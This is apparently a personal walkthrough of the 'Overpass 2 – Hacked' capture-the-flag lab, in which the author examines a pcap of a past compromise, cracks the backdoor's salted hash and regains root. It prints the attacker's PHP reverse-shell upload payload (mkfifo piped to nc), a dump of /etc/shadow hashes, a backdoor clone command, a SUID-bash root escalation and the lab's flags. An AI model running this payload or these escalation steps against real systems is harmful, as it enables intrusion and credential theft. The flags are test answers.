This is a new kind of room that I have seen here. In this case the roles are reversed. We are supposed to be on the Blue team. Examining a pcap of how we were hacked, so we can reverse engineer what happened, and use the information to hack back in and regain control of the sytem.

Task 1 - Forensics - Analyse the PCAP
-----------------------------------------------------------

Examination of the pcap using wireshark is always tedious.

I found the 1st one right away:

Question: What was the URL of the page they used to upload a reverse shell?
Answer: _/development/_

There is a password for James' new ssh key at seq 3444 we can use.

Ok at seq 14 I see the payload to gain access:

```bash
)n)ºHEô
.@@VTÀ¨ªÀ¨ªºvPÃró:
'ö©ó
Â¦+5P,ÆPOST /development/upload.php HTTP/1.1

Host: 192.168.170.159

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.170.159/development/

Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006

Content-Length: 454

Connection: keep-alive

Upgrade-Insecure-Requests: 1



-----------------------------1809049028579987031515260006

Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"

Content-Type: application/x-php



<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>


-----------------------------1809049028579987031515260006

Content-Disposition: form-data; name="submit"



Upload File

-----------------------------1809049028579987031515260006--
```

__Edit, I guess I should clear this up a bit. I am a network engineer by day and don't think much of it, but for clarity I am going to post a clear view of these here (seq11-23):__


```bash
POST /development/upload.php HTTP/1.1

Host: 192.168.170.159

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.170.159/development/

Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006

Content-Length: 454

Connection: keep-alive

Upgrade-Insecure-Requests: 1

  

-----------------------------1809049028579987031515260006

Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"

Content-Type: application/x-php

  

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

  

-----------------------------1809049028579987031515260006

Content-Disposition: form-data; name="submit"

  

Upload File

-----------------------------1809049028579987031515260006--

HTTP/1.1 200 OK

Date: Tue, 21 Jul 2020 20:34:01 GMT

Server: Apache/2.4.29 (Ubuntu)

Content-Length: 39

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8

  

The file payload.php has been uploaded.GET /development/uploads/ HTTP/1.1

Host: 192.168.170.159

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: keep-alive

Upgrade-Insecure-Requests: 1

  

HTTP/1.1 200 OK

Date: Tue, 21 Jul 2020 20:34:05 GMT

Server: Apache/2.4.29 (Ubuntu)

Vary: Accept-Encoding

Content-Encoding: gzip

Content-Length: 472

Keep-Alive: timeout=5, max=99

Connection: Keep-Alive

Content-Type: text/html;charset=UTF-8

  

............_o.0....)..0m..I....'F..D!*T.4...

....1l...!LM'X.......s.K.$...k:.... ...&.!..._.C..E...{!.J.J.GSD.Ha.%=.R........t... z ...(u....MUj.k.[...C..4.5r.k.......B.4......+.#.+D.\..6y.....qV2......+m.........h.)aP.....a<... .S.......c..NXma..\J.O....._....ID..YY..3.].n.\.u.\....0].E.k.`..f....t......F.....@4e.- .F.V...g[.Veuu.{...F.

.(@....a}.......]g.....y4^U8...k......=............D._...]..+&.s#...*.......F..!.(.y.sa.....D..\^{........X..]..........d>.E.......
```

Question: What payload did the attacker use to gain access?
Answer: _<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>_

From Seq 100:

```bash
0000   00 0c 29 6e 18 17 00 0c 29 17 ba 48 08 00 45 00   ..)n....)..H..E.
0010   00 4b 77 6e 40 00 40 06 ec bc c0 a8 aa 91 c0 a8   .Kwn@.@.........
0020   aa 9f 10 92 e1 50 67 a7 d5 05 09 61 b4 1c 80 18   .....Pg....a....
0030   01 f9 c4 f9 00 00 01 01 08 0a c2 14 dd 66 35 51   .............f5Q
0040   5c 95 77 68 65 6e 65 76 65 72 6e 6f 74 65 61 72   \.whenevernotear
0050   74 69 6e 73 74 61 6e 74 0a                        tinstant.

```

Question: What password did the attacker use to privesc?
Answer: _whenevernoteartinstant_

From SEQ 120:

```bash
0000   00 0c 29 6e 18 17 00 0c 29 17 ba 48 08 00 45 00   ..)n....)..H..E.
0010   00 68 77 75 40 00 40 06 ec 98 c0 a8 aa 91 c0 a8   .hwu@.@.........
0020   aa 9f 10 92 e1 50 67 a7 d5 31 09 61 bb 37 80 18   .....Pg..1.a.7..
0030   01 f5 2a 8b 00 00 01 01 08 0a c2 15 86 21 35 51   ..*..........!5Q
0040   84 97 67 69 74 20 63 6c 6f 6e 65 20 68 74 74 70   ..git clone http
0050   73 3a 2f 2f 67 69 74 68 75 62 2e 63 6f 6d 2f 4e   s://github.com/N
0060   69 6e 6a 61 4a 63 30 31 2f 73 73 68 2d 62 61 63   injaJc01/ssh-bac
0070   6b 64 6f 6f 72 0a                                 kdoor.
```

Question: How did the attacker establish persistence?
Answer: _https://github.com/Ninjajc01/ssh-backdoor_

From SEQ 114:

```bash
0000   00 0c 29 17 ba 48 00 0c 29 6e 18 17 08 00 45 00   ..)..H..)n....E.
0010   05 ea ae bd 40 00 40 06 af ce c0 a8 aa 9f c0 a8   ....@.@.........
0020   aa 91 e1 50 10 92 09 61 b5 64 67 a7 d5 31 80 18   ...P...a.dg..1..
0030   01 f6 dc 5e 00 00 01 01 08 0a 35 51 84 97 c2 14   ...^......5Q....
0040   fd f8 72 6f 6f 74 3a 2a 3a 31 38 32 39 35 3a 30   ..root:*:18295:0
0050   3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 64 61 65   :99999:7:::..dae
0060   6d 6f 6e 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39   mon:*:18295:0:99
0070   39 39 39 3a 37 3a 3a 3a 0d 0a 62 69 6e 3a 2a 3a   999:7:::..bin:*:
0080   31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37 3a   18295:0:99999:7:
0090   3a 3a 0d 0a 73 79 73 3a 2a 3a 31 38 32 39 35 3a   ::..sys:*:18295:
00a0   30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 73 79   0:99999:7:::..sy
00b0   6e 63 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39   nc:*:18295:0:999
00c0   39 39 3a 37 3a 3a 3a 0d 0a 67 61 6d 65 73 3a 2a   99:7:::..games:*
00d0   3a 31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37   :18295:0:99999:7
00e0   3a 3a 3a 0d 0a 6d 61 6e 3a 2a 3a 31 38 32 39 35   :::..man:*:18295
00f0   3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 6c   :0:99999:7:::..l
0100   70 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39   p:*:18295:0:9999
0110   39 3a 37 3a 3a 3a 0d 0a 6d 61 69 6c 3a 2a 3a 31   9:7:::..mail:*:1
0120   38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37 3a 3a   8295:0:99999:7::
0130   3a 0d 0a 6e 65 77 73 3a 2a 3a 31 38 32 39 35 3a   :..news:*:18295:
0140   30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 75 75   0:99999:7:::..uu
0150   63 70 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39   cp:*:18295:0:999
0160   39 39 3a 37 3a 3a 3a 0d 0a 70 72 6f 78 79 3a 2a   99:7:::..proxy:*
0170   3a 31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37   :18295:0:99999:7
0180   3a 3a 3a 0d 0a 77 77 77 2d 64 61 74 61 3a 2a 3a   :::..www-data:*:
0190   31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37 3a   18295:0:99999:7:
01a0   3a 3a 0d 0a 62 61 63 6b 75 70 3a 2a 3a 31 38 32   ::..backup:*:182
01b0   39 35 3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d   95:0:99999:7:::.
01c0   0a 6c 69 73 74 3a 2a 3a 31 38 32 39 35 3a 30 3a   .list:*:18295:0:
01d0   39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 69 72 63 3a   99999:7:::..irc:
01e0   2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a   *:18295:0:99999:
01f0   37 3a 3a 3a 0d 0a 67 6e 61 74 73 3a 2a 3a 31 38   7:::..gnats:*:18
0200   32 39 35 3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a   295:0:99999:7:::
0210   0d 0a 6e 6f 62 6f 64 79 3a 2a 3a 31 38 32 39 35   ..nobody:*:18295
0220   3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 73   :0:99999:7:::..s
0230   79 73 74 65 6d 64 2d 6e 65 74 77 6f 72 6b 3a 2a   ystemd-network:*
0240   3a 31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37   :18295:0:99999:7
0250   3a 3a 3a 0d 0a 73 79 73 74 65 6d 64 2d 72 65 73   :::..systemd-res
0260   6f 6c 76 65 3a 2a 3a 31 38 32 39 35 3a 30 3a 39   olve:*:18295:0:9
0270   39 39 39 39 3a 37 3a 3a 3a 0d 0a 73 79 73 6c 6f   9999:7:::..syslo
0280   67 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39   g:*:18295:0:9999
0290   39 3a 37 3a 3a 3a 0d 0a 6d 65 73 73 61 67 65 62   9:7:::..messageb
02a0   75 73 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39   us:*:18295:0:999
02b0   39 39 3a 37 3a 3a 3a 0d 0a 5f 61 70 74 3a 2a 3a   99:7:::.._apt:*:
02c0   31 38 32 39 35 3a 30 3a 39 39 39 39 39 3a 37 3a   18295:0:99999:7:
02d0   3a 3a 0d 0a 6c 78 64 3a 2a 3a 31 38 32 39 35 3a   ::..lxd:*:18295:
02e0   30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 75 75   0:99999:7:::..uu
02f0   69 64 64 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39   idd:*:18295:0:99
0300   39 39 39 3a 37 3a 3a 3a 0d 0a 64 6e 73 6d 61 73   999:7:::..dnsmas
0310   71 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39   q:*:18295:0:9999
0320   39 3a 37 3a 3a 3a 0d 0a 6c 61 6e 64 73 63 61 70   9:7:::..landscap
0330   65 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39   e:*:18295:0:9999
0340   39 3a 37 3a 3a 3a 0d 0a 70 6f 6c 6c 69 6e 61 74   9:7:::..pollinat
0350   65 3a 2a 3a 31 38 32 39 35 3a 30 3a 39 39 39 39   e:*:18295:0:9999
0360   39 3a 37 3a 3a 3a 0d 0a 73 73 68 64 3a 2a 3a 31   9:7:::..sshd:*:1
0370   38 34 36 34 3a 30 3a 39 39 39 39 39 3a 37 3a 3a   8464:0:99999:7::
0380   3a 0d 0a 6a 61 6d 65 73 3a 24 36 24 37 47 53 35   :..james:$6$7GS5
0390   65 2e 79 76 24 48 71 49 48 35 4d 74 68 70 47 57   e.yv$HqIH5MthpGW
03a0   70 63 7a 72 33 4d 6e 77 44 48 6c 45 44 38 67 62   pczr3MnwDHlED8gb
03b0   56 53 48 74 37 6d 61 38 79 78 7a 42 4d 38 4c 75   VSHt7ma8yxzBM8Lu
03c0   42 52 65 44 56 35 65 31 50 75 2f 56 75 52 73 6b   BReDV5e1Pu/VuRsk
03d0   75 67 74 31 43 6b 75 6c 2f 53 4b 47 58 2e 35 50   ugt1Ckul/SKGX.5P
03e0   79 4d 70 7a 41 59 6f 33 43 67 2f 3a 31 38 34 36   yMpzAYo3Cg/:1846
03f0   34 3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a   4:0:99999:7:::..
0400   70 61 72 61 64 6f 78 3a 24 36 24 6f 52 58 51 75   paradox:$6$oRXQu
0410   34 33 58 24 57 61 41 6a 33 5a 2f 34 73 45 50 56   43X$WaAj3Z/4sEPV
0420   31 6d 4a 64 48 73 79 4a 6b 49 5a 6d 31 72 6a 6a   1mJdHsyJkIZm1rjj
0430   6e 4e 78 72 59 35 63 38 47 45 6c 4a 49 6a 47 37   nNxrY5c8GElJIjG7
0440   75 33 36 78 53 67 4d 47 77 4b 41 32 77 6f 44 49   u36xSgMGwKA2woDI
0450   46 75 64 74 79 71 59 33 37 59 43 79 75 6b 69 48   FudtyqY37YCyukiH
0460   4a 50 68 69 34 49 55 37 48 30 3a 31 38 34 36 34   JPhi4IU7H0:18464
0470   3a 30 3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 73   :0:99999:7:::..s
0480   7a 79 6d 65 78 3a 24 36 24 42 2e 45 6e 75 58 69   zymex:$6$B.EnuXi
0490   4f 24 66 2f 75 30 30 48 6f 73 5a 49 4f 33 55 51   O$f/u00HosZIO3UQ
04a0   43 45 4a 70 6c 61 7a 6f 51 74 48 38 57 4a 6a 53   CEJplazoQtH8WJjS
04b0   58 2f 6f 6f 42 6a 77 6d 59 66 45 4f 54 63 71 43   X/ooBjwmYfEOTcqC
04c0   41 6c 4d 6a 65 46 49 67 59 57 71 52 35 41 6a 32   AlMjeFIgYWqR5Aj2
04d0   76 73 66 52 79 66 36 78 31 77 58 78 4b 69 74 63   vsfRyf6x1wXxKitc
04e0   50 55 6a 63 58 6c 58 2f 3a 31 38 34 36 34 3a 30   PUjcXlX/:18464:0
04f0   3a 39 39 39 39 39 3a 37 3a 3a 3a 0d 0a 62 65 65   :99999:7:::..bee
0500   3a 24 36 24 2e 53 71 48 72 70 36 7a 24 42 34 72   :$6$.SqHrp6z$B4r
0510   57 50 69 30 48 6b 6a 30 67 62 51 4d 46 75 6a 7a   WPi0Hkj0gbQMFujz
0520   31 4b 48 56 73 39 56 72 53 46 75 37 41 55 39 43   1KHVs9VrSFu7AU9C
0530   78 57 72 5a 56 37 47 7a 48 30 35 74 59 50 4c 31   xWrZV7GzH05tYPL1
0540   78 52 7a 55 4a 6c 46 48 62 79 70 30 4b 39 54 41   xRzUJlFHbyp0K9TA
0550   65 59 31 4d 36 6e 69 46 73 65 42 39 56 4c 42 57   eY1M6niFseB9VLBW
0560   53 6f 30 3a 31 38 34 36 34 3a 30 3a 39 39 39 39   So0:18464:0:9999
0570   39 3a 37 3a 3a 3a 0d 0a 6d 75 69 72 6c 61 6e 64   9:7:::..muirland
0580   3a 24 36 24 53 57 79 62 53 38 6f 32 24 39 64 69   :$6$SWybS8o2$9di
0590   76 65 51 69 6e 78 79 38 50 4a 51 6e 47 51 51 57   veQinxy8PJQnGQQW
05a0   62 54 4e 4b 65 62 32 41 69 53 70 2e 69 38 4b 7a   bTNKeb2AiSp.i8Kz
05b0   6e 75 41 6a 59 62 71 49 33 71 30 34 52 66 35 68   nuAjYbqI3q04Rf5h
05c0   6a 48 50 65 72 33 77 65 69 43 2e 32 4d 72 4f 6a   jHPer3weiC.2MrOj
05d0   32 6f 31 53 77 2f 66 64 32 63 75 30 6b 43 36 64   2o1Sw/fd2cu0kC6d
05e0   55 50 2e 3a 31 38 34 36 34 3a 30 3a 39 39 39 39   UP.:18464:0:9999
05f0   39 3a 37 3a 3a 3a 0d 0a                           9:7:::..

```

__Edit again for clarity__

```bash
james@overpass-production:~$ sudo cat /etc/shadow

sudo cat /etc/shadow

root:*:18295:0:99999:7:::

daemon:*:18295:0:99999:7:::

bin:*:18295:0:99999:7:::

sys:*:18295:0:99999:7:::

sync:*:18295:0:99999:7:::

games:*:18295:0:99999:7:::

man:*:18295:0:99999:7:::

lp:*:18295:0:99999:7:::

mail:*:18295:0:99999:7:::

news:*:18295:0:99999:7:::

uucp:*:18295:0:99999:7:::

proxy:*:18295:0:99999:7:::

www-data:*:18295:0:99999:7:::

backup:*:18295:0:99999:7:::

list:*:18295:0:99999:7:::

irc:*:18295:0:99999:7:::

gnats:*:18295:0:99999:7:::

nobody:*:18295:0:99999:7:::

systemd-network:*:18295:0:99999:7:::

systemd-resolve:*:18295:0:99999:7:::

syslog:*:18295:0:99999:7:::

messagebus:*:18295:0:99999:7:::

_apt:*:18295:0:99999:7:::

lxd:*:18295:0:99999:7:::

uuidd:*:18295:0:99999:7:::

dnsmasq:*:18295:0:99999:7:::

landscape:*:18295:0:99999:7:::

pollinate:*:18295:0:99999:7:::

sshd:*:18464:0:99999:7:::

james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::

paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::

szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::

bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::

muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor
```

So we see from this /etc/shadow file the following real users:

bee, muirland, james, szymex, paradox

Since the attacker didn't need to crack james we are left with 4 users to crack.

Question: Using the fasttrack wordlist, how many of the system passwords were crackable?
Answer: _4_

Somehow I feel I am not doing this whole CTF correctly or in order haha.. I am assuming a hacker is using the fasttrack worklist and this is what I would do?

(--break--)

Task2 - Research - Anaylse the code
---------------------------------------------------------------

Ok, pulled down the script from github that we found.
https://github.com/Ninjajc01/ssh-backdoor

Question: What's the default hash for the backdoor?
Answer: _bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3_

I found this in the main.go on line 19:
```bash
ar hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

func main() {
	var (
```

Question: What's the hardcoded salt for the backdoor?
Answer: _1c362db832f3f864c8c2fe05f2002a05_

Found in line 107:
```bash
unc passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

Question: What was the hash that the attacker used?
Answer: _6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed_


Answer found in seq 162..  i think i found that 1st. lol

```bash
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

Question: Crack the hash using rockyou and a cracking tool of your choice. What's the password?
_november16_

```bash
└─$ /usr/sbin/john james.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 SSE2 2x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2022-10-22 22:14) 0g/s 5714Kp/s 5714Kc/s 5714KC/s !!11QQqqqq..*7¡Vamos!
Session completed. 
```

Ah its the weekend I am nuts.

(--more break--)

Good thing I took a break. I realized that this password was borked because I forgot it was salted. John won't work so I need hashcat. 

The format is:

```bash
cat james.hash                               
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```

Using the following cmd in hashcat:

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/overpass-2-hacked]
└─$ hashcat -m 1710 -a 0 -o crack.txt james.hash /usr/share/wordlists/rockyou.txt --force -d 1            
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
[...]

```

After some time:

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/overpass-2-hacked]
└─$ cat crack.txt          
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```


Task 3 - Attack - Get back in!
----------------------------------------------------

Question: The attacker defaced the website. What message did the leave as the heading?
Answer: _H4ck3d by CooctusClan_

You can get that easily just by visiting the website.

Well I didn't run nmap orignally but couldn't login using SSH on port 22. So I decided to run nmap:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -oN hacked-overpass2.nmap 10.10.63.20
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-23 09:19 JST
Nmap scan report for 10.10.63.20
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e43abeedffa702d26ad6d0bb7f385ecb (RSA)
|   256 fc6f22c2134f9c624f90c93a7e77d6d4 (ECDSA)
|_  256 15fd400a6559a9b50e571b230a966305 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: LOL Hacked
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2a6d21879e3b020a24faab6ac2e6bf2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.58 seconds
```

So we got another ssh server running on port 2222.

```bash
└─$ ssh -p 2222 10.10.63.20                          
```

Logged in using the hash+salt derived password we cracked previously.

Poking around in James files I see where the backdoor was installed and a SUID binary of bash called '.suid_bash' as shown below:

```bash
james@overpass-production:/home/james/ssh-backdoor$ ls
README.md  backdoor.service  cooctus.png  id_rsa.pub  main.go
backdoor   build.sh          id_rsa       index.html  setup.sh
james@overpass-production:/home/james/ssh-backdoor$ ls -altr
total 6584
-rw-rw-r-- 1 james james   60102 Jul 21  2020 cooctus.png
-rw-rw-r-- 1 james james     815 Jul 21  2020 index.html
-rw-rw-r-- 1 james james     109 Jul 21  2020 README.md
-rw-rw-r-- 1 james james     241 Jul 21  2020 setup.sh
-rw-rw-r-- 1 james james    2788 Jul 21  2020 main.go
-rw-rw-r-- 1 james james     104 Jul 21  2020 build.sh
-rwxrwxr-x 1 james james 6634961 Jul 21  2020 backdoor
drwxrwxr-x 8 james james    4096 Jul 21  2020 .git
-rw-r--r-- 1 james james     407 Jul 21  2020 id_rsa.pub
-rw------- 1 james james    1679 Jul 21  2020 id_rsa
-rw-rw-r-- 1 james james     362 Jul 22  2020 backdoor.service
drwxrwxr-x 3 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 james james    4096 Jul 22  2020 ..
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls -altr
total 1136
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
-rw------- 1 james james      51 Jul 21  2020 .overpass
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxr-xr-x 7 james james    4096 Jul 22  2020 .

```

Lets get the user.txt flag first:

```bash
james@overpass-production:/home/james$ cat user.txt
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

Question: What's the user flag?
Answer: _thm{d119b4fa8c497ddb0525f7ad200e6567}_

Now we can run the bash with -p to run it with the user listed as owner:

```bash
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# cd /root
.suid_bash-4.4# ls
root.txt
```

Finally we can get the root.txt flag:
```bash
.suid_bash-4.4# cat root.txt
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4# 
```

Question: What's the root flag?
Answer: _thm{d53b2684f169360bb9606c333873144d}_


Conclusion:
----------------------------------

I had some issues with this room due to technical difficulties with my VM running without GPU support for hashcat, which I had to stop and solve. Also, with ssh'ing into the machine from openvpn. For some reason the remote was requiring an rsa keypair. I had to use the Attackbox for finally logging into the backdoor, but I wasted time troubleshooting this.

